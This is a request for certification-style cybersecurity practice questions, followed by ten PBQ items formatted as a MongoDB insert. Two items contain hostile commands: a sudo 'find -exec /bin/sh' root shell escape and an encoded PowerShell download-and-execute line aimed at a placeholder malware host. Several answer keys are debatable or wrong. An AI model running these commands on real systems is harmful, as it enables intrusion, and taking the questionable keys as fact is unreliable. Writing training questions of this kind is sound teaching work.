so i have a daily PBQ thing in my webapp and need highly compledx (medium diffuclty) liek techinal questions relating to compita A+, Cysa+ Pentest+, AWS cloud practictionor, cloud+, and even CISSP so its a mix of all so just gernally cybersecuirty/IT/CLoud/GRC yah know

and i need like PBQ style questions that are liek mroe ethinal and lab style than normal quetsions. so they woudl be insert liek teh example below- can you give me 10 of them?



db.dailyQuestions.insertMany([
  {
    dayIndex: 0,
    prompt: "In depth very techincal PBQ- multistep",
    options: [
      "option",
      "option",
      "option",
      "option"
    ],
    correctIndex: 2,
    explanation: "3 senetcne in depth expnantion"
  },
  {
    dayIndex: 1,
    prompt: "In depth very techincal PBQ- multistep",
    options: [
      "option",
      "option",
      "option",
      "option"
    ],
    correctIndex: 0,
    explanation: "3 senetcne in depth expnantion"
  },
10 more.....
]);

















db.dailyQuestions.insertMany([
  {
    dayIndex: 0,
    prompt: "You are performing incident response for a Windows server that was potentially compromised. You need to analyze running processes and network connections to identify malicious activity. Using the command line output provided below, identify which process is most likely associated with a command-and-control (C2) connection:\n\nTASKLIST OUTPUT:\nImage Name                   PID Session Name     Session#    Mem Usage\n========================= ======== ================ ======== ============\nsystem                        4 Services                0        8 K\nsmss.exe                    364 Services                0      736 K\ncsrss.exe                   524 Services                0    4,780 K\nwininit.exe                 608 Services                0    4,592 K\nservices.exe                652 Services                0    7,028 K\nlsass.exe                   680 Services                0   15,784 K\nsvchost.exe                 768 Services                0   26,980 K\nsvchost.exe                 796 Services                0   19,312 K\nsvchost.exe                 936 Services                0   20,908 K\nsvchost.exe                1084 Services                0   11,920 K\nsvchost.exe                1224 Services                0   14,028 K\nsvchost.exe                1328 Services                0    9,672 K\nsvchost.exe                1648 Services                0   12,212 K\nspoolsv.exe                1800 Services                0   10,640 K\nsvchost.exe                1236 Services                0    6,240 K\nsvchost.exe                2016 Services                0    5,888 K\nvssvc.exe                  2076 Services                0    6,664 K\nconhost.exe                2148 Services                0    5,936 K\nwmiapsrv.exe               2384 Services                0    5,216 K\nsvccmd.exe                 3060 Services                0    2,984 K\nconhost.exe                3456 Services                0    4,040 K\n\nNETSTAT OUTPUT:\nActive Connections\nProto  Local Address          Foreign Address        State           PID\nTCP    0.0.0.0:135            0.0.0.0:0              LISTENING       768\nTCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\nTCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1084\nTCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4\nTCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       524\nTCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       680\nTCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       652\nTCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1224\nTCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       608\nTCP    10.0.2.15:139          0.0.0.0:0              LISTENING       4\nTCP    10.0.2.15:49203        185.159.83.11:443      ESTABLISHED     3060\nTCP    10.0.2.15:49204        8.8.8.8:53             TIME_WAIT       0\nTCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1224",
    options: [
      "lsass.exe (PID 680)",
      "svccmd.exe (PID 3060)",
      "svchost.exe (PID 768)",
      "wmiapsrv.exe (PID 2384)"
    ],
    correctIndex: 1,
    explanation: "The svccmd.exe process (PID 3060) is establishing a connection to an external IP address (185.159.83.11) on port 443, which is unusual for a system service and indicative of command-and-control activity. Legitimate Windows services like lsass.exe and svchost.exe would typically not initiate external connections to unknown IP addresses. Additionally, 'svccmd.exe' is not a standard Windows process name and appears to be masquerading as a service command."
  },
  {
    dayIndex: 1,
    prompt: "As a cloud security engineer, you've detected unauthorized access to your AWS environment. After investigating, you discover temporary credentials were stolen from an EC2 instance. You need to implement a solution to prevent this in the future. Review the following IAM role configuration for the EC2 instance and identify the most secure approach to fix this vulnerability:\n\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:*\",\n        \"ec2:*\",\n        \"dynamodb:*\",\n        \"lambda:*\",\n        \"cloudwatch:*\",\n        \"logs:*\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\n```",
    options: [
      "Implement an IAM policy that applies the principle of least privilege, limiting permissions to only what the EC2 instance needs",
      "Add a Condition element to the policy to restrict access by source IP address",
      "Enable Multi-Factor Authentication (MFA) for the IAM role",
      "Set a shorter expiration time for the temporary credentials"
    ],
    correctIndex: 0,
    explanation: "The current IAM policy grants overly broad permissions with wildcards for multiple services and all resources, violating the principle of least privilege. Implementing a policy that restricts permissions to only what the EC2 instance actually needs reduces the potential damage if credentials are compromised. While IP restrictions, MFA, and shorter expiration times can help, they don't address the fundamental issue of excessive permissions that makes credential theft so dangerous."
  },
  {
    dayIndex: 2,
    prompt: "You are conducting a penetration test and have successfully gained access to an internal web server. Your goal is to escalate privileges on the Linux system. Examining the system, you discover the following output:\n\n```\n$ sudo -l\nUser tester may run the following commands on webserver:\n    (root) /usr/bin/find\n\n$ ls -la /home/tester/backup.sh\n-rwxr-xr-x 1 root root 155 Mar 10 10:22 /home/tester/backup.sh\n\n$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\ntester:x:1001:1001:Test User:/home/tester:/bin/bash\nwebadmin:x:1002:1002:Web Admin:/home/webadmin:/bin/bash\n\n$ crontab -l\n* * * * * root /home/tester/backup.sh\n```\n\nWhich privilege escalation technique would be most effective in this scenario?",
    options: [
      "Edit backup.sh to add a malicious command, as it's running as a cronjob with root privileges",
      "Use sudo to run the find command with parameters that execute a shell: 'sudo find / -exec /bin/sh \\;'",
      "Create a symbolic link from backup.sh to /etc/shadow to read password hashes",
      "Attempt a password brute force attack against the webadmin account"
    ],
    correctIndex: 1,
    explanation: "The 'sudo -l' output reveals that the tester user can run the find command as root without a password. The find command's -exec parameter can be used to execute arbitrary commands with the privileges of the user running find (in this case, root). While the backup.sh file is executed by root via cron, the output shows it's not writable by the tester user, making option A incorrect."
  },
  {
    dayIndex: 3,
    prompt: "Your organization is moving its infrastructure to AWS and needs to ensure proper security monitoring. You want to detect and respond to any unauthorized API calls across your AWS accounts. Given the following services and configurations, which combination would most effectively accomplish this goal?\n\n1. CloudTrail configuration:\n```json\n{\n  \"Name\": \"management-events\",\n  \"IncludeGlobalServiceEvents\": true,\n  \"IsMultiRegionTrail\": true,\n  \"IsOrganizationTrail\": false,\n  \"S3BucketName\": \"company-logs\"\n}\n```\n\n2. Config rule:\n```json\n{\n  \"ConfigRuleName\": \"cloudtrail-enabled\",\n  \"Description\": \"Checks if CloudTrail is enabled\",\n  \"Scope\": {\n    \"ComplianceResourceTypes\": [\"AWS::CloudTrail::Trail\"]\n  }\n}\n```\n\n3. GuardDuty settings:\n```json\n{\n  \"Enabled\": true,\n  \"FindingPublishingFrequency\": \"FIFTEEN_MINUTES\",\n  \"DataSources\": {\n    \"S3Logs\": { \"Enable\": true },\n    \"CloudTrail\": { \"Enable\": true },\n    \"DNSLogs\": { \"Enable\": true },\n    \"KubernetesAuditLogs\": { \"Enable\": false }\n  }\n}\n```",
    options: [
      "CloudTrail with CloudWatch Alarms for specific API calls and SNS notifications",
      "Config with AWS Lambda to remediate non-compliant resources",
      "GuardDuty with findings sent to Security Hub and automatic response through EventBridge",
      "CloudTrail with S3 event notifications to trigger a Lambda function"
    ],
    correctIndex: 2,
    explanation: "GuardDuty with EventBridge provides the most comprehensive solution for detecting and responding to unauthorized API calls as it continuously monitors CloudTrail logs for suspicious activity and can trigger automated responses. The configuration shows GuardDuty is properly enabled with CloudTrail as a data source, which is necessary to monitor API activity. While CloudTrail records the API calls and Config checks compliance, neither provides the threat detection intelligence that GuardDuty offers to identify potentially malicious activities."
  },
  {
    dayIndex: 4,
    prompt: "Your organization has discovered a data breach involving customer information. As the security incident response leader, you need to ensure proper handling of digital evidence for potential legal proceedings. You have an employee's laptop that was used in the breach. Which of the following procedures represents the correct order of forensic steps to preserve evidence integrity?\n\nStep A: Create a forensic image of the storage devices\nStep B: Document all actions taken with the evidence\nStep C: Establish and maintain chain of custody documentation\nStep D: Calculate and document hash values of the original media and copies\nStep E: Place the original device in a secured evidence locker\nStep F: Begin analysis on the forensic copy",
    options: [
      "C → B → A → D → E → F",
      "B → C → E → A → D → F",
      "C → B → E → A → D → F",
      "B → C → A → D → E → F"
    ],
    correctIndex: 3,
    explanation: "The correct forensic evidence handling procedure starts with documenting all actions (B), followed by establishing chain of custody (C), then creating forensic images (A), calculating hash values to verify integrity (D), securing the original evidence (E), and finally analyzing the copy (F). This sequence ensures both proper evidence documentation and integrity preservation while maintaining a defensible process for legal proceedings. Beginning with documentation is critical because every action with the evidence must be recorded from the moment it's identified."
  },
  {
    dayIndex: 5,
    prompt: "You are conducting a security assessment for a financial institution running a hybrid cloud infrastructure. During your review, you find the following network diagram and firewall rules:\n\n```\nInternet ── [ Firewall ] ── DMZ ── [ Firewall ] ── Internal Network ── [ Firewall ] ── Cloud VPN ── AWS VPC\n```\n\nFirewall Rules (External to DMZ):\n```\nSource      Destination     Protocol    Port     Action\n---------   -------------   ---------   ------   ------\nAny         DMZ Web         TCP         80       Allow\nAny         DMZ Web         TCP         443      Allow\nAny         Any             Any         Any      Deny\n```\n\nFirewall Rules (DMZ to Internal):\n```\nSource      Destination     Protocol    Port     Action\n---------   -------------   ---------   ------   ------\nDMZ Web     Internal DB     TCP         3306     Allow\nDMZ Web     Internal App    TCP         8080     Allow\nAny         Any             Any         Any      Deny\n```\n\nFirewall Rules (Internal to AWS VPC):\n```\nSource         Destination     Protocol    Port     Action\n------------   -------------   ---------   ------   ------\nInternal App   AWS S3          TCP         443      Allow\nInternal App   AWS RDS         TCP         5432     Allow\nInternal DB    AWS Backup      TCP         22       Allow\nAny            Any             Any         Any      Deny\n```\n\nWhich of the following represents the most critical security vulnerability in this configuration?",
    options: [
      "The DMZ web server has direct access to the internal database server on port 3306",
      "Port 22 (SSH) is allowed from Internal DB to AWS Backup, creating a potential backdoor",
      "HTTP (port 80) is allowed from the internet to the DMZ, exposing unencrypted traffic",
      "The lack of egress filtering on the internal network allows potential data exfiltration"
    ],
    correctIndex: 0,
    explanation: "The most critical vulnerability is allowing the DMZ web server direct access to the internal database server on port 3306 (MySQL). This violates the principle of defense in depth by permitting a server in the DMZ, which is exposed to the internet, to directly access a sensitive database. If the DMZ web server is compromised, attackers would have a direct path to the database containing sensitive financial information. A proper architecture would implement an application layer gateway or API service to mediate these connections."
  },
  {
    dayIndex: 6,
    prompt: "You're a security analyst investigating a potential ransomware attack. The system logs show suspicious PowerShell commands executed shortly before files began being encrypted. Analyze the following PowerShell command and determine what it's attempting to do:\n\n```powershell\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"$x = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHVyaSA9ICdodHRwczovL21hbHdhcmVzZXJ2ZXIuY29tL3BheWxvYWQucnVuJzskd2ViY2xpZW50LkRvd25sb2FkRmlsZSgkdXJpLCdDOlxQcm9ncmFtRGF0YVx1cGRhdGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnQzpcUHJvZ3JhbURhdGFcdXBkYXRlLmV4ZSc=')); iex $x\"\n```",
    options: [
      "It's using Windows Update to install a legitimate security patch",
      "It's conducting a security scan of the system to detect vulnerabilities",
      "It's downloading and executing malware from a remote server, disguised as an update",
      "It's encrypting system files and preparing them for exfiltration"
    ],
    correctIndex: 2,
    explanation: "The command is using PowerShell with execution flags to bypass security controls (-NoP -NonI -W Hidden -Exec Bypass) and executes Base64-encoded content. When decoded, the Base64 string reveals code that uses a WebClient object to download a file from 'malwareserver.com/payload.run' and save it as 'update.exe' in the ProgramData directory, then executes it. This is a classic technique used in ransomware attacks to fetch and run the encryption payload while evading detection."
  },
  {
    dayIndex: 7,
    prompt: "You are conducting a vulnerability assessment of your organization's web application and receive the following scan results:\n\n```\nVulnerability Scan Results:\n1. SQL Injection (CVSS 8.5) - /app/search.php parameter 'query'\n2. Cross-Site Scripting (CVSS 6.1) - /app/profile.php parameter 'bio'\n3. Outdated Apache Server v2.4.29 (CVSS 5.3) - Multiple CVEs\n4. Insecure Direct Object Reference (CVSS 7.5) - /app/getDocument.php parameter 'docId'\n5. TLS Implementation Vulnerable to BEAST Attack (CVSS 3.7) - All HTTPS connections\n```\n\nYou have limited resources and need to prioritize remediation efforts. Given the following contextual information, which vulnerability should be addressed first?\n\n- The application handles financial transactions and sensitive customer data\n- The 'search.php' page is accessible without authentication\n- User profiles (profile.php) are only viewable by authenticated users\n- Document access (getDocument.php) requires authentication but doesn't validate authorization\n- The organization is required to comply with PCI DSS",
    options: [
      "Cross-Site Scripting in profile.php",
      "SQL Injection in search.php",
      "Outdated Apache Server v2.4.29",
      "Insecure Direct Object Reference in getDocument.php"
    ],
    correctIndex: 1,
    explanation: "The SQL Injection vulnerability should be addressed first because it has the highest CVSS score (8.5), is located on a page accessible without authentication (search.php), and directly endangers sensitive financial data required to be protected under PCI DSS. This combination of high technical severity, public accessibility, and regulatory compliance implications makes it the most critical vulnerability to remediate. The Insecure Direct Object Reference, while serious, at least requires authentication first, creating a smaller attack surface."
  },
  {
    dayIndex: 8,
    prompt: "You're setting up a secure cloud-based architecture for a healthcare application that must comply with HIPAA. The application needs to store patient records, process payments, and allow doctors to access records remotely. Review the following components and configurations, then identify which aspect fails to meet compliance requirements:\n\n1. Data Storage:\n```yaml\nAWS RDS PostgreSQL:\n  Storage Encryption: AES-256 (enabled)\n  Backup Retention: 30 days\n  Multi-AZ: enabled\n  Auto Minor Version Upgrade: enabled\n```\n\n2. Network Configuration:\n```yaml\nVPC Security Groups:\n  - name: app-server-sg\n    inbound:\n      - port: 443, source: ELB Security Group\n    outbound:\n      - port: all, destination: 0.0.0.0/0\n      \n  - name: database-sg\n    inbound:\n      - port: 5432, source: app-server-sg\n    outbound:\n      - port: all, destination: 0.0.0.0/0\n```\n\n3. Logging and Monitoring:\n```yaml\nCloudTrail:\n  enabled: true\n  multi-region: true\n  s3-encryption: AES-256\n\nCloudWatch:\n  logs-retention: 90 days\n  metrics: enabled\n```\n\n4. Data Transit:\n```yaml\nELB Configuration:\n  type: Application Load Balancer\n  ssl-policy: ELBSecurityPolicy-FS-1-2-Res-2019-08\n  http-to-https-redirect: true\n\nApplication Tier:\n  ssl-certificates: ACM managed\n  minimum-tls-version: TLS 1.1\n```",
    options: [
      "Database backup retention of only 30 days is insufficient for HIPAA compliance",
      "Unrestricted outbound traffic (0.0.0.0/0) in security groups creates potential data exfiltration paths",
      "Minimum TLS version 1.1 is outdated and vulnerable to known attacks",
      "CloudWatch logs retention of 90 days doesn't meet the 6-year retention requirement for PHI access logs"
    ],
    correctIndex: 3,
    explanation: "HIPAA requires covered entities to retain documentation of policies, procedures, actions, assessments, and access logs for at least 6 years. The CloudWatch logs retention period of only 90 days is insufficient to meet this requirement, particularly for access logs to Protected Health Information (PHI). While the other issues identified may represent security best practices, they don't explicitly violate HIPAA's specific technical requirements like the inadequate log retention period does."
  },
  {
    dayIndex: 9,
    prompt: "You're a system administrator tasked with hardening a new Linux web server. The server will host a public-facing application and needs to be secured against common attacks. Given the following configuration details, identify which change would most significantly improve the server's security posture:\n\n1. Current SSH Configuration (/etc/ssh/sshd_config):\n```\nPort 22\nPermitRootLogin yes\nPasswordAuthentication yes\nX11Forwarding yes\nPermitEmptyPasswords no\nMaxAuthTries 6\n```\n\n2. Current Firewall Rules (iptables):\n```\niptables -L\nChain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http\nACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https\nACCEPT     icmp --  anywhere             anywhere            \n```\n\n3. Current User Accounts:\n```\n# grep bash /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\nuser1:x:1000:1000:User One:/home/user1:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/bash\nbackup:x:34:34:backup:/var/backups:/bin/bash\nadmin:x:1001:1001:Admin User:/home/admin:/bin/bash\n```\n\n4. Services Running:\n```\n# systemctl list-units --type=service --state=active\nSERVICE           LOAD   ACTIVE\nsshd.service      loaded active\nnginx.service     loaded active\npostgresql.service loaded active\ncron.service      loaded active\nrsyslog.service   loaded active\nfail2ban.service  loaded inactive\n```",
    options: [
      "Change the SSH configuration to disable root login and password authentication, enforcing key-based authentication",
      "Modify the firewall to implement a default DROP policy with limited explicit ACCEPT rules",
      "Change the www-data and backup user shells from /bin/bash to /sbin/nologin",
      "Activate and configure the fail2ban service to protect against brute force attacks"
    ],
    correctIndex: 2,
    explanation: "The most significant security improvement would be changing the shell for service accounts (www-data and backup) from /bin/bash to /sbin/nologin. These accounts should never need interactive login access, and having bash available provides an attack vector if these accounts are compromised. Service accounts with interactive shells violate the principle of least privilege and represent a critical security weakness, as these accounts typically have access to sensitive system areas and could be leveraged for privilege escalation."
  }
]);
